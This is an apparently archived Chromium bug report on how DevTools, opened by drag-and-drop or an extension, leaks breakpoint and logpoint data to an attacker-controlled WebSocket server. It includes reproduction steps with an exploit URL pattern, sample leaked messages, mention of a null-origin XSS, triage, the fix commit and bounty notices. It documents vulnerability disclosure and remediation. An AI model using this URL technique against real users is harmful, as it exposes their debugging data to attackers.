# DevTools frontend leaks breakpoint history to any remote WebSocket server it connects to

| Field | Value |
|-------|-------|
| **Issue ID** | [404000989](https://issues.chromium.org/issues/404000989) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Platform>DevTools |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Chrome Version** | 134.0.6998.89  |
| **Reporter** | da...@gmail.com |
| **Assignee** | dc...@chromium.org |
| **Created** | 2025-03-16 |
| **Bounty** | $2,000.00 |

## Description

# Steps to reproduce the problem

Steps to reproduce as attacker:

1. Run attacker WebSocket server, locally or remotely.

Steps to reproduce as victim:

1. Have breakpoints/logpoints set
2. Navigate to: <http://localhost:9123/#devtools://devtools/bundled/devtools_app.html?ws=192.168.0.1:6123>
3. Drag the installer icon into a new tab

# Problem Description

This vulnerability exists in any DevTools frontend page (devtools\_app.html). The vulnerability can be exploited by making the victim navigate to a particular URL, which makes the DevTools frontend connect to the attacker's WebSocket server (using the "ws" or "wss" query parameters).
The following URL can be used to exploit this vulnerability:
devtools://devtools/bundled/devtools\_app.html?&ws=[URL of attacker WebSocket server, without the protocol].

This isn't the final exploit URL though, as an attacker can't simply redirect a victim to this URL, as it contains the "devtools" protocol.
There are afaik two ways to make a victim navigate to that devtools URL, by using a 'drag and drop' interaction or via an extension with the correct permissions set (debugger permission). An example of a malicious site which uses that interaction to open the exploit URL is included in the reproduction case. Do note that BOTH the http and websocker attacker server can be fully remote hosted.

While connecting to the remote attacker-controlled websocket, the victim (whom already have set Breakpoints/Logpoints) leaks these from its browser to the attacker's websocket server. In the connection to the remote websocket server the connecting chrome-browser sends its 'Debugger.setBreakpointByUrl' messages.

\*\* As an example the victim has set some breakpoints and visits the devtools:// url: \*\*

```
>  {"id":59,"method":"Debugger.setBreakpointByUrl","params":{"lineNumber":0,"url":"chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/scripts/inpage.js","columnNumber":97,"condition":"ChromiumDataLeakTestFromMetaMask\n\n//# sourceURL=debugger://breakpoint"}}
>  {"id":60,"method":"Debugger.setBreakpointByUrl","params":{"lineNumber":1,"url":"https://www.chromium.org/_scripts/@docsearch/index.js","columnNumber":0,"condition":"/** DEVTOOLS_LOGPOINT */ console.log(ChromiumDataLeakTestFromChromiumOrg)\n\n//# sourceURL=debugger://logpoint"}}

```

Examples here is from Metamask extension as well as a logpoint set on "<https://www.chromium.org/_scripts/@docsearch/index.js>".

As the frontend cdp is heavily limited, I highly suspect this isn't intended as this data is leaking by simply connecting to it.

## BISECT

Seems to be due to how 'setAllBreakpointsEagerly' was turned on by default in this commit:

<https://chromium.googlesource.com/chromium/src/+/283a4a95c568dccade69ef4c641ab64d63281ddb>
<https://chromium.googlesource.com/devtools/devtools-frontend.git/+/0a2132a121f5a31fe72fe4309e9266d1cdb2e547>
<https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/4727398>

Before this, the breakpoints was behind a query-parameter:
<https://chromium.googlesource.com/chromium/src/+/dbde612cafe4beb115f24a997d4471fad6dfb539>

Here is where that logic was added:
<https://chromium.googlesource.com/devtools/devtools-frontend.git/+/347ba8d36b0906e6a7b582c5261b08159d520bf2>

# Summary

DevTools frontend leaks breakpoint history to any remote WebSocket server it connects to

# Custom Questions

#### Reporter credit:

Daniel Fröjdendahl

# Additional Data

Category: Security   

Chrome Channel: Stable   

Regression: N/A

## Attachments

- [attack-servers.mjs](attachments/attack-servers.mjs) (text/javascript, 1.5 KB)
- [BreakpointDataLeak.PNG](attachments/BreakpointDataLeak.PNG) (image/png, 15.1 KB)
- [index.html](attachments/index.html) (text/html, 1.9 KB)
- [installer_drag.png](attachments/installer_drag.png) (image/png, 6.6 KB)
- [package.json](attachments/package.json) (application/json, 180 B)
- [update_link2.PNG](attachments/update_link2.PNG) (image/png, 30.9 KB)
- [websocket-server.js](attachments/websocket-server.js) (text/javascript, 1.7 KB)
- [XSS.PNG](attachments/XSS.PNG) (image/png, 17.9 KB)
- [background.js](attachments/background.js) (text/javascript, 2.3 KB)
- [devtools.html](attachments/devtools.html) (text/html, 45 B)
- [manifest.json](attachments/manifest.json) (application/json, 217 B)

## Timeline

### da...@gmail.com (2025-03-16)

There also exist and Null-origin XSS present in the 'Log.entryAdded' messages due to 'data:' that is allowed. However due to the null-origin, AFAIK this means that there's no connection to the devtoolsapi/backend and thus greatly reducing the impact which is why the report itself covers breakpoint history leak.
If this is of importance I can create a new issue :)

### da...@gmail.com (2025-03-16)

Similar issues:
<https://issues.chromium.org/issues/40942152>
<https://issues.chromium.org/issues/402791076>

### ps...@google.com (2025-03-17)

I am having a little trouble reproducing this. danilsomsikov@ could you take a look, provisionally I am setting severity and priority but if you think otherwise you can change it.   

### sz...@google.com (2025-03-18)

<https://crbug.com/402791076#comment3> already points out that breakpoint info leaks in it's initial report when drag'n drop is used to open devtools:// URLs. Unless there is anything new here we close this as a duplicate @danil?

### da...@google.com (2025-03-18)

No, I think this is different, as it doesn't rely on clicking on the javascript: link

### ch...@google.com (2025-03-18)

Setting milestone because of s0/s1 severity.

### da...@google.com (2025-03-18)

I don't think that reporting breakpoints proactively is a problem here. DevTools frontend code expects the backend to be trusted, otherwise it won't be able to function at all.

I think the main issue here is that it is too easy to point DevTools frontend to an untrusted backend. The drag and drop issue was reported before, and it's impact is not limited to the DevTools. Chrome should properly sanitize plain text drag data, I have a pending CL fixing that.

Re. the chrome extension with the debugger permissions, I am not sure if it is worth addressing. The only thing we could do is disable navigating to the devtools:// scheme, potentially breaking some valid use cases. OTOH, even though extensions with debugger or or devtools permissions don't have access to breakpoints, they have access to much more sensitive data. I doubt it is worth protecting against exfiltration of breakpoints, when these extension can exfiltrate cookies:)

### dc...@chromium.org (2025-03-24)

I've noted this on the review as well, but we should just stop synthesizing URLs from text in drags unless the URL is a http or https URLs. This filtering should be done in the various implementations of OSExchangeDataProvider::GetURLAndTitle(): <https://source.chromium.org/chromium/chromium/src/+/main:ui/base/dragdrop/os_exchange_data_provider.h;l=72;drc=d6c295470c9181b0a61511e2b1a4f427f568e8fc>.

There is a lot of strange edge cases that this otherwise exposes: for example, dropping the text "chrome://settings" results in opening a new to "about:blank#blocked" if you drop over a random web page, but opening a new tab to "chrome://settings" if you happen to be over WebUI.

### da...@gmail.com (2025-03-26)

#8 - Correcting myself a little here from my original report, as it doesnt solely require `debugger` permission.
Opening devtools URL is possible with just `"devtools_page": "devtools.html"` in the extension manifest, a simpler PoC of this is in the attachments!
If it was only a matter of `debugger` permission I would totally agree that stealing cookies etc would be of a much higher priority :)

### dx...@google.com (2025-03-28)

Project: chromium/src  

Branch: main  

Author: Daniel Cheng [dcheng@chromium.org](mailto:dcheng@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6400553>

Don't allow text -> URL conversion when dropping to bypass URL filtering

---


Expand for full commit details
```
     
    When starting a drag from a renderer, the browser process filters out 
    URLs that the initiating renderer process should not be able to navigate 
    to, e.g. a random http/https page should not be able to specify 
    chrome://settings/ as URL to navigate to when dropped. 
     
    However, when dropping, Chrome is clever and tries to interpret text as 
    URLs when needed. To prevent this from bypassing the URL filtering, only 
    allow this conversion if: 
    - the drag data does not originate from the renderer 
    - or the text to URL conversion results in a HTTP or HTTPS url 
     
    Bug: 404000989 
    Change-Id: I28baf7e6385b440af7e76b08471588299e24e247 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6400553 
    Reviewed-by: Avi Drissman <avi@chromium.org> 
    Commit-Queue: Daniel Cheng <dcheng@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1439671}

```

---

Files:

- M `chrome/browser/ui/views/frame/browser_root_view.cc`
- M `chrome/browser/ui/views/frame/browser_root_view_browsertest.cc`
- M `ui/base/clipboard/clipboard_util_mac.mm`
- M `ui/base/clipboard/clipboard_util_mac_unittest.mm`
- M `ui/base/dragdrop/os_exchange_data_provider.h`
- M `ui/base/dragdrop/os_exchange_data_provider_non_backed.cc`
- M `ui/base/dragdrop/os_exchange_data_provider_non_backed.h`
- M `ui/base/dragdrop/os_exchange_data_provider_win.cc`
- M `ui/base/dragdrop/os_exchange_data_provider_win.h`
- M `ui/base/dragdrop/os_exchange_data_unittest.cc`
- M `ui/base/ui_base_features.cc`
- M `ui/base/ui_base_features.h`

---

Hash: 7675c9965682a9d83de5aff379ab78531204238d  

Date:  Fri Mar 28 20:30:27 2025


---

### dc...@chromium.org (2025-04-01)

I consider this fixed; that being said, I wasn't able to verify this myself since I don't quite understand the repro steps. @ds...@chromium.org if there's some way you can help with that, it'd be appreciated.

### da...@gmail.com (2025-04-01)

#12 - Yes this looks like it is indeed fixed. Nice job!

### Tested on Stable: 135.0.7049.42 (cohort: Stable Installs & Version Pins)

Drag-and-drop a protected URI (devtools:// or chrome://) into a new tab: **Reproduces**

Upon Websocket connect, breakpoints leak: **Reproduces**

### Tested on Canary: 136.0.7102.0 (cohort: Clang-64)

Drag-and-drop a protected URI (devtools:// or chrome://) into a new tab: **Cannot Reproduce**

Upon Websocket connect, breakpoints leak: **Cannot Reproduce**

In canary even if we manually navigate to the url `devtools://devtools/bundled/devtools_app.html?ws=127.0.0.1:6123&panel=console` it doesnt leak any breakpoints. It does connect to the websocket (WAI) and the null-origined XSS is still possible - although that might still be WAI :)

### sp...@google.com (2025-04-10)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
report of lower impact information disclosure


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-04-10)

Congratulations Daniel! Thank you for your efforts and reporting this issue to us.

### da...@gmail.com (2025-04-11)

Awesome job and thank you! :)

### ch...@google.com (2025-04-30)

deleted

### ch...@google.com (2025-07-09)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### sp...@google.com (2025-09-19)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
$1000 bisect bonus, apologies for missing this the first time round.


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

## Bounty Award

> report of lower impact information disclosure

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/404000989)*
